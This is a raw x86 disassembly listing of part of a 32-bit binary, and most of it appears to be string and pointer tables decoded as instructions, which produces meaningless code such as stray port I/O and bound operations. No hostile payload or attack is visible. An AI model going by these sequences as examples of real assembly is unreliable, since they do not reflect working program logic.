  42806c:	jge    0x4280eb
  42806e:	aad    0x23
  428070:	jge    0x428049
  428072:	fmul   DWORD PTR [ebp-0x2b]
  428075:	xor    eax,0x35d54d2d
  42807a:	sub    eax,0x2d35d54d
  42807f:	dec    ebp
  428080:	aad    0x35
  428082:	sub    eax,0x55357580
  428087:	dec    ebp
  428088:	test   esp,0x35d54d39
  42808e:	and    eax,0x2535d54d
  428093:	dec    ebp
  428094:	aad    0x35
  428096:	and    eax,0x81357580
  42809b:	dec    ebp
  42809c:	test   esp,0x35d54d90
  4280a2:	adc    eax,0x3d357580
  4280a7:	dec    ebp
  4280a8:	test   esp,0x3575806f
  4280ae:	xor    eax,0x7550f74d
  4280b3:	xor    eax,0x357580ef
  4280b8:	and    DWORD PTR [edi+0x6a],ecx
  4280bb:	aad    0xa1
  4280bd:	xor    BYTE PTR [ebp+0x35],0xee
  4280c1:	jl     0x428090
  4280c3:	test   BYTE PTR [edx],bh
  4280c5:	lea    ecx,[ebp+0x386f24f5]
  4280cb:	xor    BYTE PTR [ebp+0x35],0xef
  4280cf:	xor    BYTE PTR [ecx],0x35
  4280d2:	out    dx,al
  4280d3:	adc    BYTE PTR [eax-0x7d],0x3a
  4280d7:	lea    ecx,[ebp+0x757c3a50]
  4280dd:	xor    eax,0x6f24f6ef
  4280e2:	cmp    BYTE PTR [eax-0x7f10ca8b],al
  4280e8:	xor    DWORD PTR ds:0xedfc53ef,esi
  4280ee:	add    eax,0x29bab20d
  4280f3:	mov    dl,0x86
  4280f5:	or     al,0xff
  4280f7:	mov    dl,0x80
  4280f9:	xor    DWORD PTR ds:0xd7b26321,esi
  4280ff:	and    eax,DWORD PTR [eax-0x7f11ca8b]
  428105:	xor    DWORD PTR ds:0x835080ee,esi
  42810b:	cmp    cl,BYTE PTR [ebp-0x7f91b273]
  428111:	int    0x32
  428113:	cmp    cl,BYTE PTR [ebp+0x3d0a4d8d]
  428119:	les    ebx,FWORD PTR [edi]
  42811b:	add    DWORD PTR [edi-0x12],esi
  42811e:	push   eax
  42811f:	jne    0x428156
  428121:	and    DWORD PTR [eax-0x7fdeca8b],eax
  428127:	xor    DWORD PTR ds:0xe55080ee,esi
  42812d:	cmp    cl,BYTE PTR [ebp+0x3a30808d]
  428133:	out    dx,eax
  428134:	xor    BYTE PTR [ebp+0x35],0xee
  428138:	or     ch,0x87
  42813b:	cmp    cl,BYTE PTR [ebp-0x7f10b273]
  428141:	xor    DWORD PTR ds:0x865080ee,esi
  428147:	cmp    cl,BYTE PTR [ebp+0x18d808d]
  42814d:	out    dx,al
  42814e:	mov    ds:0xee353180,al
  428153:	adc    BYTE PTR [eax-0x1b],0x3a
  428157:	lea    ecx,[ebp+0x30808d80]
  42815d:	cmp    ch,bh
  42815f:	test   eax,0xfba7b880
  428164:	sub    eax,0x614c748d
  428169:	imul   edi,DWORD PTR [ecx+0x62],0x69
  42816d:	popa   
  42816e:	push   0x6c656548
  428173:	ins    BYTE PTR es:[edi],dx
  428174:	outs   dx,DWORD PTR ds:[esi]
  428175:	ja     0x428177
  428177:	popa   
  428178:	ins    DWORD PTR es:[edi],dx
  428179:	imul   edi,DWORD PTR [edx+0x65],0x676f6e70
  428180:	push   ebp
  428181:	outs   dx,BYTE PTR ds:[esi]
  428182:	bound  esp,QWORD PTR [ebp+0x0]
  428185:	push   0x6572576d
  42818a:	outs   dx,BYTE PTR ds:[esi]
  42818b:	jne    0x4281f1
  42818d:	outs   dx,DWORD PTR ds:[esi]
  42818e:	popa   
  42818f:	push   0x6b637573
  428194:	add    BYTE PTR [ebp+0x6f],cl
  428197:	ins    DWORD PTR es:[edi],dx
  428198:	imul   ecx,DWORD PTR [ebp+0x75],0x6c617367
  42819f:	jo     0x428206
  4281a1:	je     0x4281a3
  4281a3:	dec    edx
  4281a4:	gs jae 0x42821a
  4281a7:	ins    BYTE PTR es:[edi],dx
  4281a8:	outs   dx,DWORD PTR ds:[esi]
  4281a9:	dec    edi
  4281aa:	js     0x428211
  4281ac:	outs   dx,BYTE PTR ds:[esi]
  4281ad:	outs   dx,DWORD PTR ds:[esi]
  4281ae:	jb     0x428211
  4281b0:	add    BYTE PTR [edi+0x6f],al
  4281b3:	ja     0x428219
  4281b5:	dec    ebp
  4281b6:	imul   esi,DWORD PTR [ebx+0x6f],0x706179
  4281bd:	imul   esi,DWORD PTR fs:[eax+0x6f],0x6d6f6d72
  4281c5:	imul   esp,DWORD PTR [ebx+0x6b],0x6c6c4900
  4281cc:	jae    0x42823b
  4281ce:	popa   
  4281cf:	fs jns 0x428241
  4281d2:	imul   ebp,DWORD PTR [ecx+0x0],0x6b
  4281d6:	imul   esi,DWORD PTR [edx+0x7a],0x64756261
  4281dd:	bound  esi,QWORD PTR [ebp+0x6d]
  4281e0:	add    BYTE PTR [ebp+0x72],al
  4281e3:	outs   dx,DWORD PTR ds:[si]
  4281e5:	jo     0x428248
  4281e7:	jns    0x42824f
  4281e9:	imul   edi,DWORD PTR [eax+0x0],0x6d736e6f
  4281f0:	jne    0x42825f
  4281f2:	popa   
  4281f3:	gs fs jo 0x42825c
  4281f7:	imul   esi,DWORD PTR [esi+0x79],0x67756800
  4281fe:	dec    esp
  4281ff:	outs   dx,DWORD PTR ds:[esi]
  428200:	jne    0x428266
  428202:	push   0x6d6d7069
  428207:	add    BYTE PTR [edi+0x6c],al
  42820a:	outs   dx,DWORD PTR ds:[esi]
  42820b:	jo     0x428260
  42820d:	ja     0x42827e
  42820f:	bound  eax,QWORD PTR [eax]
  428211:	jns    0x428282
  428213:	pop    ecx
  428214:	gs ins BYTE PTR es:[edi],dx
  428216:	jo     0x428271
  428218:	jne    0x428286
  42821a:	gs gs jae 0x42827f
  42821e:	popa   
  42821f:	add    BYTE PTR [ecx+0x77],ah
  428222:	popa   
  428223:	inc    esi
  428224:	imul   ebp,DWORD PTR [esi+0x65],0x4f706173
  42822b:	outs   dx,BYTE PTR ds:[esi]
  42822c:	je     0x42829d
  42822e:	add    BYTE PTR [ebp+0x73],ah
  428231:	dec    esp
  428232:	imul   ebp,DWORD PTR [esi+0x67],0x68737574
  428239:	ins    BYTE PTR es:[edi],dx
  42823a:	outs   dx,DWORD PTR ds:[esi]
  42823b:	bound  esp,QWORD PTR [ebp+0x0]
  42823e:	push   0x617a6761
  428243:	bound  ebp,QWORD PTR [edi+0x75]
  428246:	jo     0x428248
  428248:	inc    edx
  428249:	outs   dx,DWORD PTR ds:[esi]
  42824a:	jb     0x4282c0
  42824c:	popa   
  42824d:	js     0x4282be
  42824f:	data16 jo 0x4282b7
  428252:	imul   esi,DWORD PTR [ebp+ebp*2+0x61],0x776f0077
  42825a:	fs gs popa 
  42825d:	outs   dx,DWORD PTR fs:[esi]
  42825f:	jae    0x4282d9
  428261:	jne    0x428263
  428263:	inc    edi
  428264:	add    BYTE PTR [edi+0x0],ch
  428267:	add    BYTE PTR gs:[ebx+0x0],dh
  42826b:	dec    edx
  42826c:	add    BYTE PTR [ecx+0x0],ah
  42826f:	jbe    0x428271
  428271:	popa   
  428272:	add    BYTE PTR [eax],al
  428274:	add    BYTE PTR [edx+0x0],al
  428277:	popa   
  428278:	add    BYTE PTR [edx+0x0],ah
  42827b:	jne    0x42827d
  42827d:	outs   dx,DWORD PTR ds:[esi]
  42827e:	add    BYTE PTR [ebp+0x0],ch
  428281:	push   0x6d00
  428286:	add    BYTE PTR [edx+0x0],dh
  428289:	popa   
  42828a:	add    BYTE PTR [eax+eax*1+0x74],dh
  42828e:	add    BYTE PTR [ecx+0x0],ah
  428291:	ins    DWORD PTR es:[edi],dx
  428292:	add    BYTE PTR [edi+0x0],ah
  428295:	popa   
  428296:	add    BYTE PTR [ecx+0x0],bh
  428299:	js     0x42829b
  42829b:	imul   eax,DWORD PTR [eax],0x610000
  4282a1:	ins    DWORD PTR es:[edi],dx
  4282a2:	add    BYTE PTR [ecx+0x0],ah
  4282a5:	ins    BYTE PTR es:[edi],dx
  4282a6:	add    BYTE PTR [edx+0x0],ah
  4282a9:	outs   dx,DWORD PTR ds:[esi]
  4282aa:	add    BYTE PTR [edi+0x0],ch
  4282ad:	popa   
  4282ae:	add    BYTE PTR [eax+0x0],dh
  4282b1:	jo     0x4282b3
  4282b3:	add    BYTE PTR [eax],al
  4282b5:	popa   
  4282b6:	add    BYTE PTR [esi+0x0],dh
  4282b9:	popa   
  4282ba:	add    BYTE PTR [edi+0x0],ah
  4282bd:	outs   dx,DWORD PTR ds:[esi]
  4282be:	add    BYTE PTR [ebx+0x0],dh
  4282c1:	push   0x77006f00
  4282c6:	add    BYTE PTR [eax+eax*1+0x65],ch
  4282ca:	add    BYTE PTR [ebp+0x0],dh
  4282cd:	add    BYTE PTR fs:[ebp+0x0],ah
  4282d1:	add    BYTE PTR fs:[eax],al
  4282d4:	add    BYTE PTR [eax+0x0],cl
  4282d7:	popa   
  4282d8:	add    BYTE PTR [edx+0x0],dh
  4282db:	add    BYTE PTR gs:[edx+0x0],al
  4282df:	imul   eax,DWORD PTR [eax],0x6b0072
  4282e5:	arpl   WORD PTR [eax],ax
  4282e7:	popa   
  4282e8:	add    BYTE PTR [ebp+0x0],ch
  4282eb:	add    BYTE PTR [eax],al
  4282ed:	imul   eax,DWORD PTR [eax],0x61
  4282f0:	add    BYTE PTR [edi+0x0],dh
  4282f3:	popa   
  4282f4:	add    BYTE PTR [eax+0x0],bh
  4282f7:	outs   dx,DWORD PTR ds:[esi]
  4282f8:	add    BYTE PTR [edi+0x0],ch
  4282fb:	je     0x4282fd
  4282fd:	add    BYTE PTR [eax],al
  4282ff:	jb     0x428301
  428301:	jne    0x428303
  428303:	add    BYTE PTR gs:[ecx+0x0],ah
  428307:	ins    BYTE PTR es:[edi],dx
  428308:	add    BYTE PTR [eax+eax*1+0x68],ch
  42830c:	add    BYTE PTR [ebp+0x0],ch
  42830f:	ins    DWORD PTR es:[edi],dx
  428310:	add    BYTE PTR [eax],al
  428312:	add    BYTE PTR [edi+0x0],ch
  428315:	add    BYTE PTR gs:[eax+0x0],bh
  428319:	imul   eax,DWORD PTR [eax],0x650072
  42831f:	ja     0x428321
  428321:	outs   dx,DWORD PTR ds:[esi]
  428322:	add    BYTE PTR [ebp+0x0],ah
  428325:	popa   
  428326:	add    BYTE PTR [edx+0x0],ah
  428329:	ins    BYTE PTR es:[edi],dx
  42832a:	add    BYTE PTR [ecx+0x0],ch
  42832d:	add    BYTE PTR [eax],al
  42832f:	jne    0x428331
  428331:	ins    DWORD PTR es:[edi],dx
  428332:	add    BYTE PTR [esi+0x0],ch
  428335:	outs   dx,DWORD PTR ds:[esi]
  428336:	add    BYTE PTR [edi+0x0],ah
  428339:	bound  eax,QWORD PTR [eax]
  42833b:	popa   
  42833c:	add    BYTE PTR [esi+0x0],dh
  42833f:	outs   dx,DWORD PTR ds:[esi]
  428340:	add    BYTE PTR [edi+0x0],dh
  428343:	bound  eax,QWORD PTR [eax]
  428345:	add    BYTE PTR gs:[eax+eax*1+0x0],ch
  42834a:	add    BYTE PTR [eax],al
  42834c:	add    bh,dh
  42834e:	sub    al,0x10
  428350:	add    BYTE PTR [esi],bl
  428352:	aaa    
  428353:	adc    BYTE PTR [eax],al
  428355:	and    al,0x42
  428357:	adc    BYTE PTR [eax],al
  428359:	rol    BYTE PTR [eax+edx*1],cl
  42835c:	add    ch,dh
  42835e:	xor    BYTE PTR [eax],dl
  428360:	add    BYTE PTR [esi-0x1affefcf],dh
  428366:	cmp    dl,BYTE PTR [eax]
  428368:	add    BYTE PTR [ebx],dh
  42836a:	ins    BYTE PTR es:[edi],dx
  42836b:	adc    BYTE PTR [eax],al
  42836d:	sub    DWORD PTR [eax+edx*1+0x0],esp
  428371:	push   ecx
  428372:	inc    ecx
  428373:	adc    BYTE PTR [eax],al
  428375:	mov    cl,0x60
  428377:	adc    BYTE PTR [eax],al
  428379:	aas    
  42837a:	or     al,0x10
  42837c:	add    al,bh
  42837e:	and    DWORD PTR [eax],edx
  428380:	add    BYTE PTR [edx+0x37],dl
  428383:	adc    BYTE PTR [eax],al
  428385:	test   eax,0xa3001054
  42838a:	add    DWORD PTR [eax],edx
  42838c:	add    BYTE PTR [edi],ah
  42838e:	push   esp
  42838f:	adc    BYTE PTR [eax],al
  428391:	cmc    
  428392:	push   esi
  428393:	adc    BYTE PTR [eax],al
  428395:	imul   ecx,DWORD PTR [ebx],0x10
  428398:	add    BYTE PTR [ebp-0x7d],cl
  42839b:	inc    edx
  42839c:	add    BYTE PTR [ecx-0x7d],dl
  42839f:	inc    edx
  4283a0:	add    BYTE PTR [ebp-0x7d],dl
  4283a3:	inc    edx
  4283a4:	add    BYTE PTR [ecx-0x7d],bl
  4283a7:	inc    edx
  4283a8:	add    BYTE PTR [ebp-0x7d],bl
  4283ab:	inc    edx
  4283ac:	add    BYTE PTR [ecx-0x7d],ah
  4283af:	inc    edx
  4283b0:	add    BYTE PTR [ebp-0x7d],ah
  4283b3:	inc    edx
  4283b4:	add    BYTE PTR [ecx-0x7d],ch
  4283b7:	inc    edx
  4283b8:	add    BYTE PTR [ebp-0x7d],ch
  4283bb:	inc    edx
  4283bc:	add    BYTE PTR [ecx-0x7d],dh
  4283bf:	inc    edx
  4283c0:	add    BYTE PTR [ebp-0x7d],dh
  4283c3:	inc    edx
  4283c4:	add    BYTE PTR [ecx-0x7d],bh
  4283c7:	inc    edx
  4283c8:	add    BYTE PTR [ebp-0x7d],bh
  4283cb:	inc    edx
  4283cc:	add    BYTE PTR [ecx-0x7affbd7d],al
  4283d2:	add    DWORD PTR [edx+0x0],0xffffff89
  4283d6:	add    DWORD PTR [edx+0x0],0xffffff8d
  4283da:	add    DWORD PTR [edx+0x0],0xffffff91
  4283de:	add    DWORD PTR [edx+0x0],0xffffff95
  4283e2:	add    DWORD PTR [edx+0x0],0x25
  4283e6:	test   BYTE PTR [edx+0x0],al
  4283e9:	sub    DWORD PTR [edx+eax*2+0x42842d00],eax
  4283f0:	add    BYTE PTR [ecx],dh
  4283f2:	test   BYTE PTR [edx+0x0],al
  4283f5:	xor    eax,0x39004284
  4283fa:	test   BYTE PTR [edx+0x0],al
  4283fd:	cmp    eax,0x41004284
  428402:	test   BYTE PTR [edx+0x0],al
  428405:	inc    ebp
  428406:	test   BYTE PTR [edx+0x0],al
  428409:	dec    ecx
  42840a:	test   BYTE PTR [edx+0x0],al
  42840d:	dec    ebp
  42840e:	test   BYTE PTR [edx+0x0],al
  428411:	push   ecx
  428412:	test   BYTE PTR [edx+0x0],al
  428415:	push   ebp
  428416:	test   BYTE PTR [edx+0x0],al
  428419:	pop    ecx
  42841a:	test   BYTE PTR [edx+0x0],al
  42841d:	pop    ebp
  42841e:	test   BYTE PTR [edx+0x0],al
  428421:	popa   
  428422:	test   BYTE PTR [edx+0x0],al
  428425:	arpl   WORD PTR [eax],si
  428427:	adc    BYTE PTR [eax],al
  428429:	push   ecx
  42842a:	xor    DWORD PTR [eax],edx
  42842c:	add    BYTE PTR [edi+ebx*2+0x10],ch
  428430:	add    BYTE PTR [ebx-0x5ffefc3],bl
  428436:	aaa    
  428437:	adc    BYTE PTR [eax],al
  428439:	(bad)  
  42843a:	pop    esi
  42843b:	adc    BYTE PTR [eax],al
  42843d:	call   0x1040:0xa400106a
  428444:	add    BYTE PTR [esi+0x23],ah
  428447:	adc    BYTE PTR [eax],al
  428449:	xor    DWORD PTR [eax],ebx
  42844b:	adc    BYTE PTR [eax],al
  42844d:	mov    edi,DWORD PTR [edi]
  42844f:	adc    BYTE PTR [eax],al
  428451:	and    BYTE PTR [ecx+0x10],0x0
  428455:	clc    
  428456:	ja     0x428468
  428458:	add    BYTE PTR [eax],dh
  42845a:	xor    dl,BYTE PTR [eax]
  42845c:	add    BYTE PTR [edx+esi*2+0x6bfb0010],ch
  428463:	adc    BYTE PTR [eax],al
  428465:	mov    fs,WORD PTR [ebx+0x10]
  428468:	add    BYTE PTR [ecx+0x6200107e],bl
  42846e:	daa    
  42846f:	adc    BYTE PTR [eax],al
  428471:	mov    edi,0x2e001069
  428476:	sub    eax,0x413c0010
  42847b:	adc    BYTE PTR [eax],al
  42847d:	xor    BYTE PTR [eax],dh
  42847f:	adc    BYTE PTR [eax],al
  428481:	outs   dx,BYTE PTR ds:[esi]
  428482:	dec    edi
  428483:	adc    BYTE PTR [eax],al
  428485:	adc    eax,0xeb001025
  42848a:	bound  edx,QWORD PTR [eax]
  42848c:	add    BYTE PTR [edi],dh
  42848e:	and    dl,BYTE PTR [eax]
  428490:	add    BYTE PTR [ebx+0x1a],bl
  428493:	adc    BYTE PTR [eax],al
  428495:	mov    BYTE PTR [esi+0x10],ch
  428498:	add    BYTE PTR [esi],ah
  42849a:	pusha  
  42849b:	adc    BYTE PTR [eax],al
  42849d:	pop    es
  42849e:	adc    eax,0x1ca50010
  4284a3:	adc    BYTE PTR [eax],al
  4284a5:	test   BYTE PTR gs:[edx+0x0],al
  4284a9:	imul   eax,DWORD PTR [edx+eax*2+0x42846d00],0x42847100
  4284b4:	add    BYTE PTR [ebp-0x7c],dh
  4284b7:	inc    edx
  4284b8:	add    BYTE PTR [ecx-0x7c],bh
  4284bb:	inc    edx
  4284bc:	add    BYTE PTR [ebp-0x7c],bh
  4284bf:	inc    edx
  4284c0:	add    BYTE PTR [ecx-0x7affbd7c],al
  4284c6:	test   BYTE PTR [edx+0x0],al
  4284c9:	mov    DWORD PTR [edx+eax*2+0x42848d00],eax
  4284d0:	add    BYTE PTR [ecx-0x6affbd7c],dl
  4284d6:	test   BYTE PTR [edx+0x0],al
  4284d9:	cdq    
  4284da:	test   BYTE PTR [edx+0x0],al
  4284dd:	popf   
  4284de:	test   BYTE PTR [edx+0x0],al
  4284e1:	mov    eax,ds:0xa5004284
  4284e6:	das    
  4284e7:	adc    BYTE PTR [eax],al
  4284e9:	add    bh,BYTE PTR [esi+0x10]
  4284ec:	add    BYTE PTR [ebx],ch
  4284ee:	adc    al,0x10
  4284f0:	add    BYTE PTR ds:0x4b001060,ah
  4284f6:	pop    edx
  4284f7:	adc    BYTE PTR [eax],al
  4284f9:	dec    ecx
  4284fa:	jne    0x42850c
  4284fc:	add    dh,ch
  4284fe:	pop    esp
  4284ff:	adc    BYTE PTR [eax],al
  428501:	push   edx
  428502:	cmp    eax,0x529b0010
  428507:	adc    BYTE PTR [eax],al
  428509:	pop    ss
  42850a:	cmp    dl,BYTE PTR [eax]
  42850c:	add    BYTE PTR [ebp-0x64ffef93],cl
  428512:	xor    eax,0x158d0010
  428517:	adc    BYTE PTR [eax],al
  428519:	adc    DWORD PTR [edi+0x10],ebp
  42851c:	add    BYTE PTR [ecx+0x51],ch
  42851f:	adc    BYTE PTR [eax],al
  428521:	jmp    0x42852f
  428523:	adc    BYTE PTR [eax],al
  428525:	in     eax,0x84
  428527:	inc    edx
  428528:	add    cl,ch
  42852a:	test   BYTE PTR [edx+0x0],al
  42852d:	in     eax,dx
  42852e:	test   BYTE PTR [edx+0x0],al
  428531:	icebp  
  428532:	test   BYTE PTR [edx+0x0],al
  428535:	cmc    
  428536:	test   BYTE PTR [edx+0x0],al
  428539:	stc    
  42853a:	test   BYTE PTR [edx+0x0],al
  42853d:	std    
  42853e:	test   BYTE PTR [edx+0x0],al
  428541:	add    DWORD PTR [ebp-0x7afaffbe],eax
  428547:	inc    edx
  428548:	add    BYTE PTR [ecx],cl
  42854a:	test   DWORD PTR [edx+0x0],eax
  42854d:	or     eax,0x11004285
  428552:	test   DWORD PTR [edx+0x0],eax
  428555:	adc    eax,0x19004285
  42855a:	test   DWORD PTR [edx+0x0],eax
  42855d:	sbb    eax,0x21004285
  428562:	test   DWORD PTR [edx+0x0],eax
  428565:	xlat   BYTE PTR ds:[ebx]
  428566:	inc    ebp
  428567:	adc    BYTE PTR [eax],al
  428569:	xlat   BYTE PTR ds:[ebx]
  42856a:	pusha  
  42856b:	adc    BYTE PTR [eax],al
  42856d:	lea    ebp,[eax+edx*1+0x0]
  428571:	hlt    
  428572:	add    BYTE PTR [eax],dl
  428574:	add    BYTE PTR [esp+esi*2],dl
  428577:	adc    BYTE PTR [eax],al
  428579:	out    0x44,al
  42857b:	adc    BYTE PTR [eax],al
  42857d:	dec    esi
  42857e:	bound  edx,QWORD PTR [eax]
  428580:	add    BYTE PTR [edi+ebp*2],ch
  428583:	adc    BYTE PTR [eax],al
  428585:	cmp    ebx,DWORD PTR [ebx]
  428587:	adc    BYTE PTR [eax],al
  428589:	inc    ebp
  42858a:	pop    ecx
  42858b:	adc    BYTE PTR [eax],al
  42858d:	imul   BYTE PTR [ecx+0x10]
  428590:	add    BYTE PTR [esi],ah
  428592:	arpl   WORD PTR [eax],dx
  428594:	add    BYTE PTR [ebp-0x4fffefee],bh
  42859a:	sbb    edx,DWORD PTR [eax]
  42859c:	add    BYTE PTR [ebx],ah
  42859e:	adc    BYTE PTR ds:[eax],al
  4285a1:	xchg   ebx,eax
  4285a2:	push   ecx
  4285a3:	adc    BYTE PTR [eax],al
  4285a5:	test   DWORD PTR gs:[edx+0x0],eax
  4285a9:	imul   eax,DWORD PTR [ebp-0x7a92ffbe],0x85710042
  4285b3:	inc    edx
  4285b4:	add    BYTE PTR [ebp-0x7b],dh
  4285b7:	inc    edx
  4285b8:	add    BYTE PTR [ecx-0x7b],bh
  4285bb:	inc    edx
  4285bc:	add    BYTE PTR [ebp-0x7b],bh
  4285bf:	inc    edx
  4285c0:	add    BYTE PTR [ecx-0x7affbd7b],al
  4285c6:	test   DWORD PTR [edx+0x0],eax
  4285c9:	mov    DWORD PTR [ebp-0x7a72ffbe],eax
  4285cf:	inc    edx
  4285d0:	add    BYTE PTR [ecx-0x6affbd7b],dl
  4285d6:	test   DWORD PTR [edx+0x0],eax
  4285d9:	cdq    
  4285da:	test   DWORD PTR [edx+0x0],eax
  4285dd:	popf   
  4285de:	test   DWORD PTR [edx+0x0],eax
  4285e1:	mov    eax,ds:0x4285
	...
  4285f2:	add    BYTE PTR [eax],al
  4285f4:	sub    ch,dl
  4285f6:	mov    dh,0x4f
  4285f8:	add    BYTE PTR [eax],al
  4285fa:	add    BYTE PTR [eax],al
  4285fc:	pusha  
  4285fd:	xchg   esi,eax
  4285fe:	add    al,BYTE PTR [eax]
  428600:	add    DWORD PTR [eax],eax
  428602:	add    BYTE PTR [eax],al
  428604:	add    DWORD PTR [eax],eax
  428606:	add    BYTE PTR [eax],al
  428608:	add    DWORD PTR [eax],eax
  42860a:	add    BYTE PTR [eax],al
  42860c:	xor    BYTE PTR [esi-0x69affffe],dl
  428612:	add    al,BYTE PTR [eax]
  428614:	inc    eax
  428615:	xchg   esi,eax
  428616:	add    al,BYTE PTR [eax]
	...
  428620:	xor    BYTE PTR [ecx+0x2],cl
  428626:	add    BYTE PTR [eax],al
  428628:	dec    esi
  428629:	mov    DWORD PTR [edx],eax
  42862b:	add    BYTE PTR [edx-0x77],ah
  42862e:	add    al,BYTE PTR [eax]
  428630:	js     0x4285bb
  428632:	add    al,BYTE PTR [eax]
  428634:	mov    BYTE PTR [ecx-0x7669fffe],cl
  42863a:	add    al,BYTE PTR [eax]
  42863c:	scas   al,BYTE PTR es:[edi]
  42863d:	mov    DWORD PTR [edx],eax
  42863f:	add    BYTE PTR [edx-0x2ffffd77],bh
  428645:	mov    DWORD PTR [edx],eax
  428647:	add    ah,bl
  428649:	mov    DWORD PTR [edx],eax
  42864b:	add    dh,ch
  42864d:	mov    DWORD PTR [edx],eax
  42864f:	add    dl,bh
  428651:	mov    DWORD PTR [edx],eax
  428653:	add    BYTE PTR [edx],cl
  428655:	mov    al,BYTE PTR [edx]
  428657:	add    BYTE PTR [edx],bl
  428659:	mov    al,BYTE PTR [edx]
  42865b:	add    BYTE PTR [esi],ah
  42865d:	mov    al,BYTE PTR [edx]
  42865f:	add    BYTE PTR [edx+ecx*4],dh
  428662:	add    al,BYTE PTR [eax]
  428664:	inc    eax
  428665:	mov    al,BYTE PTR [edx]
  428667:	add    BYTE PTR [edx+ecx*4+0x2],cl
  42866b:	add    BYTE PTR [esi-0x76],dl
  42866e:	add    al,BYTE PTR [eax]
  428670:	push   0xffffff8a
  428672:	add    al,BYTE PTR [eax]
  428674:	jl     0x428600
  428676:	add    al,BYTE PTR [eax]
  428678:	xchg   BYTE PTR [edx-0x756ffffe],cl
  42867e:	add    al,BYTE PTR [eax]
  428680:	mov    al,ds:0xb000028a
  428685:	mov    al,BYTE PTR [edx]
  428687:	add    dl,al
  428689:	mov    al,BYTE PTR [edx]
  42868b:	add    dl,dl
  42868d:	mov    al,BYTE PTR [edx]
  42868f:	add    al,ah
  428691:	mov    al,BYTE PTR [edx]
  428693:	add    ah,ch
  428695:	mov    al,BYTE PTR [edx]
  428697:	add    dl,bh
  428699:	mov    al,BYTE PTR [edx]
  42869b:	add    BYTE PTR [edx],cl
  42869d:	mov    eax,DWORD PTR [edx]
  42869f:	add    BYTE PTR [edx],bl
  4286a1:	mov    eax,DWORD PTR [edx]
  4286a3:	add    BYTE PTR [eax],ch
  4286a5:	mov    eax,DWORD PTR [edx]
  4286a7:	add    BYTE PTR [eax-0x75],al
  4286aa:	add    al,BYTE PTR [eax]
  4286ac:	dec    edx
  4286ad:	mov    eax,DWORD PTR [edx]
  4286af:	add    BYTE PTR [edx-0x75],bl
  4286b2:	add    al,BYTE PTR [eax]
  4286b4:	jb     0x428641
  4286b6:	add    al,BYTE PTR [eax]
  4286b8:	test   BYTE PTR [ebx-0x746bfffe],cl
  4286be:	add    al,BYTE PTR [eax]
  4286c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4286c1:	mov    eax,DWORD PTR [edx]
  4286c3:	add    BYTE PTR [esi-0x43fffd75],ch
  4286c9:	mov    eax,DWORD PTR [edx]
  4286cb:	add    ah,cl
  4286cd:	mov    eax,DWORD PTR [edx]
  4286cf:	add    al,bl
  4286d1:	mov    eax,DWORD PTR [edx]
	...
  4286db:	add    BYTE PTR [edx],al
  4286dd:	mov    WORD PTR [edx],es
  4286df:	add    BYTE PTR [eax],dl
  4286e1:	mov    WORD PTR [edx],es
  4286e3:	add    BYTE PTR [esp+ecx*4],ah
  4286e6:	add    al,BYTE PTR [eax]
  4286e8:	xor    cl,BYTE PTR [edx+eax*1+0x28c4800]
  4286ef:	add    BYTE PTR [edx-0x74],dl
  4286f2:	add    al,BYTE PTR [eax]
  4286f4:	pop    esi
  4286f5:	mov    WORD PTR [edx],es
  4286f7:	add    BYTE PTR [esi-0x74],ch
  4286fa:	add    al,BYTE PTR [eax]
  4286fc:	or     BYTE PTR [edx+eax*1+0x28c9e00],0x0
  428704:	mov    al,0x8c
  428706:	add    al,BYTE PTR [eax]
  428708:	mov    esi,0xcc00028c
  42870d:	mov    WORD PTR [edx],es
  42870f:	add    al,ah
  428711:	mov    WORD PTR [edx],es
  428713:	add    ah,dh
  428715:	mov    WORD PTR [edx],es
  428717:	add    BYTE PTR [ecx*4-0x72edfffe],al
  42871e:	add    al,BYTE PTR [eax]
  428720:	and    BYTE PTR [ebp-0x72cdfffe],cl
  428726:	add    al,BYTE PTR [eax]
  428728:	inc    esp
  428729:	lea    eax,[edx]
  42872b:	add    BYTE PTR [ebp+ecx*4+0x2],dl
  42872f:	add    BYTE PTR [esi-0x73],ah
  428732:	add    al,BYTE PTR [eax]
  428734:	jb     0x4286c3
  428736:	add    al,BYTE PTR [eax]
  428738:	xchg   BYTE PTR [ebp-0x7265fffe],cl
  42873e:	add    al,BYTE PTR [eax]
  428740:	stos   BYTE PTR es:[edi],al
  428741:	lea    eax,[edx]
  428743:	add    BYTE PTR [esi-0x3bfffd73],dh
  428749:	lea    eax,[edx]
  42874b:	add    dl,dl
  42874d:	lea    eax,[edx]
  42874f:	add    dl,ah
  428751:	lea    eax,[edx]
  428753:	add    al,bh
  428755:	lea    eax,[edx]
  428757:	add    BYTE PTR [esi+ecx*4],al
  42875a:	add    al,BYTE PTR [eax]
  42875c:	adc    BYTE PTR [esi-0x71e3fffe],cl
  428762:	add    al,BYTE PTR [eax]
  428764:	xor    cl,BYTE PTR [esi-0x71bbfffe]
  42876a:	add    al,BYTE PTR [eax]
  42876c:	push   esp
  42876d:	mov    es,WORD PTR [edx]
  42876f:	add    BYTE PTR [edx-0x72],ah
  428772:	add    al,BYTE PTR [eax]
  428774:	jbe    0x428704
  428776:	add    al,BYTE PTR [eax]
  428778:	test   BYTE PTR [esi-0x7167fffe],cl
  42877e:	add    al,BYTE PTR [eax]
  428780:	stos   BYTE PTR es:[edi],al
  428781:	mov    es,WORD PTR [edx]
  428783:	add    BYTE PTR [eax-0x2bfffd72],bh
  428789:	mov    es,WORD PTR [edx]
  42878b:	add    dh,ah
  42878d:	mov    es,WORD PTR [edx]
  42878f:	add    dh,dh
  428791:	mov    es,WORD PTR [edx]
  428793:	add    BYTE PTR [eax],dl
  428795:	pop    DWORD PTR [edx]
  428797:	add    BYTE PTR [esi],ah
  428799:	pop    DWORD PTR [edx]
  42879b:	add    BYTE PTR [edi+ecx*4],dh
  42879e:	add    al,BYTE PTR [eax]
  4287a0:	inc    edx
  4287a1:	pop    DWORD PTR [edx]
  4287a3:	add    BYTE PTR [eax-0x71],bl
  4287a6:	add    al,BYTE PTR [eax]
  4287a8:	je     0x428739
  4287aa:	add    al,BYTE PTR [eax]
  4287ac:	or     BYTE PTR [edi-0x706bfffe],0x2
  4287b3:	add    BYTE PTR [eax-0x41fffd71],ch
  4287b9:	pop    DWORD PTR [edx]
  4287bb:	add    ah,dl
  4287bd:	pop    DWORD PTR [edx]
  4287bf:	add    dl,ch
  4287c1:	pop    DWORD PTR [edx]
  4287c3:	add    al,bh
  4287c5:	pop    DWORD PTR [edx]
  4287c7:	add    BYTE PTR [eax+edx*4],cl
